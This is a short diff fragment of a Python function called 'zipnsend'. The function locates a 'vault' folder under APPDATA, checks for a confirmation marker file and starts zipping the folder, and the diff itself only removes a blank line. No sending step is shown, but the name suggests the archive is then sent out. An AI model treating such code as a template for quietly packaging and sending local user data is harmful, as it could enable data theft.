@@ -5,7 +5,6 @@ def zipnsend():
     vault_folder = os.path.join(os.getenv('APPDATA'), 'vault')
     zip_file_path = os.path.join(os.getenv('APPDATA'), 'vault.zip')
     confirm_file = os.path.join(vault_folder, 'confirmation.fullbright')
-
     if os.path.exists(vault_folder) and os.path.exists(confirm_file):
         try:
             with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
